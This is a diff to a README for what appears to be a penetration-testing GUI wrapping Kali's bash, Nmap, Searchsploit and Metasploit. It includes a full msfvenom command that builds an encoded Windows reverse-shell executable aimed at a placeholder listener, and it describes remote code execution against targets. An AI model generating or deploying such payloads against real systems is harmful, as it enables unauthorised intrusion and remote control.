@@ -25,3 +25,32 @@ If you no have the shell.exe, use the msfvenom to spawn one.
 msfvenom -p windows/shell_reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=<Your Local IP> LPORT=<Listen Port> -f exe -o shell.exe
 ```
 
+Linux Bash:
+Type the IP address of kali and type your bash command on it, than you can execute.
+If you know how to use the ssh, then you should be know how to use this modulel.
+
+Example Command:
+```
+ifconfig
+```
+
+Nmap Module:
+Type the IP address of kali and target and setup the option then you can execute.
+Scan report will below the console.
+
+
+Searchsploit Module:
+Type the vulnerabilities number or CMS/Service name and version.
+If the input text is vulnerable, than it will show the exploit.
+
+Metasploit Module:
+Type the RHost LHost to input box and select a exploit module, then you can exploit.
+For security reason, if metasploit successful remote code execution, the target will be shutdown in 3 second.
+**The Target is not 100% can be exploit**
+
+
+My Email:aifred0729@yahoo.com
+My Facebook:https://www.facebook.com/profile.php?id=100009717251061
+
+Try Harder!!
+
